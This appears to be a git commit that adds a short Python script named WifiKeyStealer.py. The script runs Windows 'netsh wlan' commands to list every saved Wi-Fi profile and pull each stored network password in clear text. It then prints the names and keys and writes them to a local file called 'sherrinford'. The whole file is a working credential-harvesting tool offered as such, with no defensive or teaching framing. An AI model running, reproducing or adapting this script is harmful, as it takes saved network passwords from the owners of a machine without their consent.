4190eeb2c12e56f40dfee6d200a966a5e0d137ef
c41f0n <C41f0N@protonmail.com>
2022-07-12 23:01:23 +0500

    Initial commit

---
+++ WifiKeyStealer.py
@@ -0,0 +1,34 @@
+import os
+
+x = os.popen('netsh wlan show profile')
+
+wifiList = []
+
+endFile = False
+
+y = x.readlines()
+
+for line in y:
+    if "All User Profile" in line:
+        line = line[27: len(line)]
+        wifiList.append(line.strip())
+
+wifiCredentials = []
+
+for wifiName in wifiList:
+    x = os.popen(f'netsh wlan show profile name = "{wifiName}" key = clear')
+    infoLines = x.readlines()
+    for line in infoLines:
+        if "Key Content" in line:
+            key = line[28: len(line)].strip()
+            wifiCredentials.append([wifiName, key])
+
+print(wifiCredentials)
+
+file = open('sherrinford', 'w')
+x = ''
+for i in wifiCredentials:
+    x += "Wifi Name: " + i[0] + "\n"
+    x += i[1] + "\n\n"
+
+file.write(x)
